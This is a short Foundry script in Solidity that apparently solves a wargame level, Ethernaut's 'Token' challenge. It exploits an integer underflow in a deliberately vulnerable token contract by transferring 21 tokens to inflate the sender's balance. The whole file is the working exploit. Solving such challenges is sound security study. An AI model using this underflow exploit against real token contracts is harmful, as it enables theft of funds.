// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/05_token.sol";

contract AttackerTokenScript is Script {
    Token token = Token(vm.envAddress("INSTANCE"));

    function run() external {
        console.log("token", address(token));
        console.log("this", address(this));

        vm.startBroadcast();

        console.log("Current balance is :", token.balanceOf(msg.sender));
        token.transfer(address(this), 21);
        console.log("New balance is :", token.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
